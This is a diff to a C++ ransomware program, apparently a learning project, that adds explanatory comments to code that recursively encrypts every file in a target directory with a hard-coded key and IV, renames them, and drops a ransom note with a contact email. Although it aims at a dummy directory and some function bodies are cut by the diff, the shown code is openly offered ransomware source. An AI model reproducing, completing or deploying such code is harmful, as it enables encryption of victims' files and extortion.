@@ -11,16 +11,19 @@ using recursive_directory_iterator = std::filesystem::recursive_directory_iterat
 void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* filename);
 void leaveNote(std::string target_dir, const char* message);
 
+
+// code that visits every single file in a target directory and encrypts them
 int main(){
 
-    std::string target_dir = "dummy_directory_1";
+    std::string target_dir = "dummy_directory_1";   // this is the target directory for the ransomware
     std::filesystem::path myPath = target_dir;
     std::string file;
 
-    unsigned char key_chars[] = "Hard-coded key here.";
-    unsigned char iv[] = "some random IV value";
+    unsigned char key_chars[] = "Hard-coded key here.";     // ransomware's encryption key
+    unsigned char iv[] = "some random IV value";            // ransomware's initialization value
 
-    for (const auto& dirEntry : recursive_directory_iterator(myPath)){
+    // loop that recursively visits every single file in the target directory and encrypts them
+    for (const auto& dirEntry : recursive_directory_iterator(myPath)){  
 
         if (!dirEntry.is_directory()){
 
@@ -33,11 +36,14 @@ int main(){
             std::filesystem::rename(oldName, newName);
         }
     }
+    // ransom note (cybercriminals leave ransom notes after encrypting everything)
     const char* ransom_message = "Harharhar! You've been hit by ransomware! Contact this email to negotiate: not_a_hacker@gmail.com.";
     leaveNote(target_dir, ransom_message);
     return 0;
 }
 
+// funcion that encrypts a file given an encryption key and IV
+// for more granular comments on this, check encrypt_file2.cpp in the encryption tests folder
 void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* filename){
     int bytes_read;
     int bytes_written;
@@ -64,6 +70,7 @@ void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* file
     fclose(file_ptr);
 }
 
+// function to leave the ransom note
 void leaveNote(std::string target_dir, const char* message){
     std::string ransom_note_file = target_dir + "/ransom_note.txt";
     FILE* notePtr = fopen(ransom_note_file.c_str(), "w");
